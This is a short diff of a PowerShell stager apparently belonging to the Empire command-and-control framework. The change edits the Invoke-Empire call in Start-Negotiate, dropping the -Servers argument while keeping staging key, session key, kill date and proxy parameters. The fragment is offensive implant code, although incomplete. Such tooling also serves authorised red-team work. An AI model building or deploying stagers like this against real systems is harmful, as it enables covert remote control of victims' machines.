@@ -238,7 +238,7 @@ function Start-Negotiate {
 
     "stage 0 calling invoke Empire" | Out-File "out.log" -Append -NoCLobber;
     # TODO: remove this shitty $server logic
-    Invoke-Empire -Servers @(($s -split "/")[0..2] -join "/") -StagingKey $SK -SessionKey $key -SessionID $ID -WorkingHours "WORKING_HOURS_REPLACE" -KillDate "REPLACE_KILLDATE" -ProxySettings $Script:Proxy;
+    Invoke-Empire -StagingKey $SK -SessionKey $key -SessionID $ID -WorkingHours "WORKING_HOURS_REPLACE" -KillDate "REPLACE_KILLDATE" -ProxySettings $Script:Proxy;
     "stage0 done with invoke empire" | Out-File "out.log" -Append -NoClobber
 }
 "calling start negotiate" | Out-File "out.log" -Append -NoClobber;
